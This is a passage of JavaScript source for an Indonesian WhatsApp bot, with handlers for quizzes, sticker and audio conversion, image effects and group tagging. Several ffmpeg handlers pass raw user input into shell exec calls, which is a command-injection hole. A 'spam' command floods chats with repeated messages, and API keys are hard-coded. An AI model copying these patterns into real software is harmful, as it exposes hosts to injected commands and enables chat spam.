                    N = `KE *KOMTOLAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 🙂`
                    reply(N)
                    break 
                    case 'pakboycek': 
                    N = `KE *PAKBOYZ* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 😏`
                    reply(N)
                    break 
                    case 'pakgirlcek':	
                    N = `KE *PAKGILR* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 😏`
                    reply(N)
                    break             
                    case 'sangecek':
                    N = `JIWA *SANGE* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 🤤`
                    reply(N)
                    break
                    case 'bapercek':
                    N = `JIWA *BEPERAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 😘`
                    reply(N)
                    break                   
		case 'caklontong2':
                if (!isRegistered) return reply(ind.noregis())
		if (isLimit(sender)) return reply(ind.limitend(pusname))
		if (!isGroup) return reply(ind.groupo())
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/caklontong2?apikey=${LoLKey}`, {method: 'get'})
					lontong = `*${anu.result.question}*`
					jawab = `
*➸ Jawaban :* ${anu.result.answer}
*➸ Info :* ${anu.result.information}`
					setTimeout( () => {
					Angga.sendMessage(from, jawab, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, lontong, text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break
					case 'runtime':
					if (isBanned) return reply(mess.only.benned)    
		    		if (!isRegister) return reply(mess.only.daftarB)
				Angga.updatePresence(from, Presence.composing) 
				uptime = process.uptime()
				reply(`Bot Telah Aktif Selama\n*${kyun(uptime)}*`)
				break
		case 'tebakkimia':
                if (!isRegistered) return reply(ind.noregis())
		if (isLimit(sender)) return reply(ind.limitend(pusname))
		if (!isGroup) return reply(ind.groupo())
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/unsurkimia?apikey=${LoLKey}`, {method: 'get'})
					kimia = `*${anu.result.nama}*`
					setTimeout( () => {
					Angga.sendMessage(from, '*➸ Jawaban :* '+anu.result.lambang, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, kimia, text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
		case 'tebaklirik':
                if (!isRegistered) return reply(ind.noregis())
		if (isLimit(sender)) return reply(ind.limitend(pusname))
		if (!isGroup) return reply(ind.groupo())
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/lirik?apikey=${LoLKey}`, {method: 'get'})
					lirik = `*${anu.result.question}*`
					setTimeout( () => {
					Angga.sendMessage(from, '*➸ Jawaban :* '+anu.result.answer, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, lirik, text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
		case 'colong':
                    if ((isMedia && !mek.message.videoMessage || isQuotedSticker)) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await Angga.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join("Riu").split("|")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${LoLKey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": ini_txt[0],
                                "author": ini_txt[1]
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            Angga.sendMessage(from, ini_buff, sticker, { quoted: mek }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Tag sticker yang sudah dikirim`)
                    }
                    break
		case 'ghost':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(media)
					if (err) return reply('Error!')
					hah = fs.readFileSync(ran)
					Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', quoted: mek})
                    fs.unlinkSync(ran)
				    })
		            break
		case 'tempo-v':
   var req = args.join(' ')            
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, video, { mimetype: 'video/mp4', quoted: mek })
})
				break
				case 'spam':
				if (!args) return reply("Penggunaan ${prefix}spam teks|jumlahspam")
				argz = args.split("|")
				if (!args) return reply("Penggunaan ${prefix}spam teks|jumlahspam")
				if (isNaN(argz[1])) return reply("harus berupa angka")
				for (let i = 0; i < argz[1]; i++){
					Angga.sendMessage(from, argz[0])
				}
				break
				case 'vibra':     
var req = args.join(' ')            

					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=${req}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
									case 'vibrav':     
var req = args.join(' ')            

					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=${req}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
										Angga.sendMessage(from, hah, video, { mimetype: 'video/mp4', quoted: mek })
})
					break
					case 'trigger':
					   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					media = await Angga.downloadAndSaveMediaMessage(encmedia)

					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
				case 'gemes':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						riu = fs.readFileSync(ran)
					Angga.sendMessage(from, riu, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
					break
						case 'stickermeme':
						if ((isMedia && !mek.videoMessage || isQuotedImage)) {
						test = args.join(" ")
					        reply("Wait Bro Promses Dlu Yekan:V")
						var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
						var media = await Angga.downloadAndSaveMediaMessage(encmedia)
						anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", media)
						getUrl = `${anu.display_url}`

						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								//buff = fs.readFileSync(ran)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
						buffer = getBuffer(`https://api-self.herokuapp.com/api/memegen1?teks=${test}&img_url=${getUrl}`)
								Angga.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
					}
						//Angga.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
							break
		case 'anime':
		if (!isRegistered) return reply(ind.noregis())
		if (!isPremium) return reply('Fitur Ini Khusus User Premium')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No HaAnggaome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/anime?apikey=${LoLKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    Angga.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'wait2':
		if (!isRegistered) return reply(ind.noregis())
		if (!isPremium) return reply('Fitur Ini Khusus Premium')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const filePath = await Angga.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        const form = new FormData();
                        const stats = fs.statSync(filePath);
                        const fileSizeInBytes = stats.size;
                        const fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        const options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`http://api.lolhuman.xyz/api/wait?apikey=${LoLKey}`, {...options })
                        fs.unlinkSync(filePath)
                        get_result = get_result.result
                        ini_video = await getBuffer(get_result.video)
                        ini_txt = `Anilist id : ${get_result.anilist_id}\n`
                        ini_txt += `MAL id : ${get_result.mal_id}\n`
                        ini_txt += `Title Romaji : ${get_result.title_romaji}\n`
                        ini_txt += `Title Native : ${get_result.title_native}\n`
                        ini_txt += `Title English : ${get_result.title_english}\n`
                        ini_txt += `at : ${get_result.at}\n`
                        ini_txt += `Episode : ${get_result.episode}\n`
                        ini_txt += `Similarity : ${get_result.similarity}`
                        Angga.sendMessage(from, ini_video, video, { quoted: mek, caption: ini_txt })
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
		case 'hetshot':
			if (!isGroup) return reply(ind.groupo())
			if (!isGroupAdmins) return reply(ind.admin())
			if (!isBotGroupAdmins) return reply(ind.badmin())
			mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
			Angga.groupRemove(from, mentioned)
			reply("SUKSES")
			break
		case 'setthumb':
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Angga.downloadMediaMessage(boij)
				fs.writeFileSync(`me.jpg`, delb)
				reply('Sukses Bero')
				break
		case 'tovid':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (!isQuotedSticker) return reply('Reply Stickernya!')
					reply(ind.wait())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(`Error: ${err}`)
						buffer = fs.readFileSync(ran)
						Angga.sendMessage(from, buffer, video, { mimetype: Mimetype.mp4, caption: '*DAH JADI SETAN* '})
						fs.unlinkSync(ran)
					})
					await limitAdd(sender)
					break
			case 'takestick':
		if (!isRegistered) return reply(ind.noregis())
                    if ((isMedia && !mek.message.videoMessage || isQuotedSticker)) {
                        if (args.length == 0) return reply(`Example: ${prefix + command} mek|Human`)
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await Angga.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `http://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": ini_txt[0],
                                "author": ini_txt[1]
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            Angga.sendMessage(from, ini_buff, sticker, { quoted: mek })
                            fs.unlinkSync(file_name)
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
		case 'harcos':
					if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Masukan Textnya!`)
					query = args.join(" ")
					buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/hartacustom?apikey=VevekKuda&text=${body.slice(7)}`)
					cap = `${query}`
					Angga.sendMessage(from, buffer, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: cap})
					break
		case 'harta':
				if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Url png/jpg mana kak')
				query = args.join(" ")
				reply('wait bro...')
				buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/hartatahta?apikey=VevekKuda&text=${body.slice(7)}`)
				cap = `Harta Tahta ${query}`
				Angga.sendMessage(from, buffer, image, {quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: cap })
				await limitAdd(sender)
				break
		case 'setthumb':
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Angga.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./me.jpeg`, delb)
				fs.writeFileSync('./img.json', JSON.stringify(imagenye))
				Angga.sendMessage(from, `\`\`\`Sukses Mengganti Thumbnail\`\`\``, MessageType.text, { quoted: mek })
				break
		case 'togif':
                                        if (!isQuotedSticker) return reply('Reply stiker nya')
                                        if (!isRegistered) return reply( ind.noregis())
					                    if (isLimit(sender)) return reply(ind.limitend(pusname))
                                        reply('wait...')
                                        if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
                                        const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        const media = await Angga.downloadAndSaveMediaMessage(encmedia)
                                        const upload = await uploadimg(media, Date.now() + '.webp')
                                        const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
                                        const buff = await getBuffer(rume.data.result)
                                        Angga.sendMessage(from, buff, video, { mimetype: Mimetype.gif, caption: 'Oke...', quoted: mek})
                                }
                                await limitAdd(sender)
                                break
		case 'getpic':
		if (!isRegistered) return reply( ind.noregis())
					                    if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (mek.message.extendedTextMessage != undefined){
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await Angga.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					thumb = await getBuffer(pic)
					Angga.sendMessage(from, thumb, MessageType.image)
				{quoted : mek }}
				await limitAdd(sender)
				break
		case 'tovideo':
					if (!isQuotedSticker) return reply('Reply Gif nya')
					reply('Wait...')
					anume = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					anum = await Angga.downloadAndSaveMediaMessage(anume)
					ran = getRandom('.webp')
					exec(`ffmpeg -i ${anum} ${ran}`, (err) => {
						fs.unlinkSync(anum)
						if (err) return reply(`Error: ${err}`)
						buffers = fs.readFileSync(ran)
						Angga.sendMessage(from, buffers, video, { quoted: mek, caption: 'Sudah...' })
						fs.unlinkSync(ran)
					})
					break
		case 'kontak':
                        tahu = args[0]
                        names = args[1]
                        if (isNaN(tahu)) return reply('Invalid phone number'.toUpperCase());
                        vcard = 'BEGIN:VCARD\n'
                                  + 'VERSION:3.0\n'
                                  + `FN:${names}\n`
                                  + `TEL;type=CELL;type=VOICE;waid=${tahu}:${phoneNum('+' + tahu).getNumber('internasional')}\n`
                                  + 'END:VCARD'.trim()
                            Angga.sendMessage(from, {displayName: names, vcard: vcard}, contact)
                            break
		case 'upswtext':
					Angga.updatePresence(from, Presence.composing)
					Angga.sendMessage('status@broadcast', `${q}`, extendedText)
					Angga.sendMessage(from, `Sukses Up story wea teks ${q}`, text,{quoted : mek, contextInfo: { forwardingScore: 15, isForwarded: true}})
					break
					
		case 'kontag':
					var bv = body.slice(8)
					var jl = `${bv}`
					if (args[0] === '') {
					var jl = `*CONTACT TAG*`
					}
					var group = await Angga.groupMetadata(from)
					   var member = group['participants']
					   var mem = []
					   member.map(async adm => {
					   mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					   })
					const vcardtag = 'BEGIN:VCARD\n'
					            + 'VERSION:3.0\n'
					            + `FN:${body.slice(8)}\n`
					            + 'ORG: Cie Ke Tag;\n'
					            + `TEL;type=CELL;type=VOICE;waid=${Angga.user.jid.split('@')[0]}:${Angga.user.jid.split('@')[0]}\n`
					            + 'END:VCARD'
            				Angga.sendMessage(from, {displayname: mem, vcard: vcardtag}, MessageType.contact, { quoted: mek, contextInfo: {mentionedJid: mem}, quoted: mek })
				        break
				case 'tempo':
   var req = args.join(" ")            
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:999999999999})
						fs.unlinkSync(ran)
					})
				break
		case 'tagimg':
                    if (!isOwner) return reply(ind.ownerb())
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await Angga.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await Angga.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = {
                            contextInfo: { mentionedJid: mem },
                            quoted: mek
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        Angga.sendMessage(from, ini_buffer, image, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Tag image yang sudah dikirim`)
                    }
                    break
                    case 'tagstick':
                    if (!isOwner) return reply(ind.ownerb())
                    if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await Angga.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await Angga.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = {
                            contextInfo: { mentionedJid: mem },
                            quoted: mek
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        Angga.sendMessage(from, ini_buffer, sticker, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Tag sticker yang sudah dikirim`)
                    }
                    break
		case 'removebg':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(10)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/removebg?apikey=${LoLKey}&img=${anu.display_url}`)
	 Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'smile':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/tosmile?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'skullmask':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/skullmask?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'fisheye':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(9)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/fisheye?apikey=${LoLKey}&img=${anu.display_url}`)
	  Angga.sendMessage(from, hehe, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: 'SUBSCRIBE MY : FxAG Xc'})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'deepfry':
	if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(9)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/deepfry?apikey=${LoLKey}&img=${anu.display_url}`)
